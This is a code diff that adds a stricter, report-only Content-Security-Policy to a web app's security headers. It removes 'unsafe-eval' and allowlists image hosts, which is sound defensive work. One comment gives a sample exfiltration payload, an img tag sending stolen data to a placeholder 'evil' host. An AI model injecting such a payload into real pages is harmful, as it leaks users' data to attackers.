@@ -127,6 +127,46 @@ function buildCsp(): string {
     .join('; ')
 }
 
+/**
+ * 2026-05-12 (perfect-e2e plan Phase 4.2 + 4.3) — tightened CSP for the
+ * Report-Only soak window. This is what we want to ENFORCE next, but first
+ * we ship it as a second Report-Only header to collect 48h of violations
+ * from real production traffic. If `integration_signals` shows zero novel
+ * violations against this tighter policy, we promote it to the primary
+ * (enforcing) header.
+ *
+ * Differences from `cspDirectives`:
+ *   - `script-src` drops `'unsafe-eval'` (was conditionally included)
+ *   - `img-src` allowlists specific hosts instead of `https:` wildcard
+ *     (current wildcard lets a stored-XSS exfil via `<img src="//evil/?stolen=...">`)
+ */
+const tightenedDirectives: Record<string, string[]> = {
+  ...cspDirectives,
+  'script-src': cspDirectives['script-src'].filter(s => s !== "'unsafe-eval'"),
+  'img-src': [
+    "'self'",
+    'data:',
+    'blob:',
+    supabaseHost ? `https://${supabaseHost}` : 'https://*.supabase.co',
+    'https://js.stripe.com',
+    'https://m.stripe.network',
+    'https://q.stripe.com',
+    'https://lh3.googleusercontent.com',          // Google profile pics
+    'https://*.googleusercontent.com',            // Google CDN (maps, etc.)
+    'https://avatars.githubusercontent.com',      // GitHub avatars (if used)
+    'https://www.gravatar.com',                   // Gravatar
+    'https://api.qrserver.com',                   // QR codes (whatsapp pairing)
+    'https://maps.googleapis.com',                // Google Maps tiles
+    'https://maps.gstatic.com',                   // Google Maps static
+  ],
+}
+
+function buildTightenedCsp(): string {
+  return Object.entries(tightenedDirectives)
+    .map(([k, v]) => v.length === 0 ? k : `${k} ${v.join(' ')}`)
+    .join('; ')
+}
+
 const securityHeaders = [
   {
     key: 'Strict-Transport-Security',
@@ -176,6 +216,23 @@ const securityHeaders = [
   {
     key: enforceCsp ? 'Content-Security-Policy' : 'Content-Security-Policy-Report-Only',
     value: buildCsp(),
+  },
+  // 2026-05-12 (perfect-e2e plan Phase 4.2 + 4.3) — SECONDARY Report-Only
+  // header carrying the tightened policy (no unsafe-eval, allowlisted img
+  // hosts). Browsers honour multiple Report-Only headers; violations from
+  // BOTH land in /api/csp-report → integration_signals. After 48h of clean
+  // reports against this policy, promote tightenedDirectives into
+  // cspDirectives + ship.
+  //
+  // To distinguish soak violations from the primary policy, the soak header
+  // omits `report-to` (modern API) — only `report-uri` reaches the endpoint.
+  // The handler can filter by `User-Agent` or the absence of certain
+  // directive deltas, but in practice the soak diff is detectable by
+  // querying for blocked URIs that the primary policy allows (e.g. any
+  // `https:` img-src URL outside the tightened allowlist).
+  {
+    key: 'Content-Security-Policy-Report-Only',
+    value: buildTightenedCsp(),
   },
 ]
 
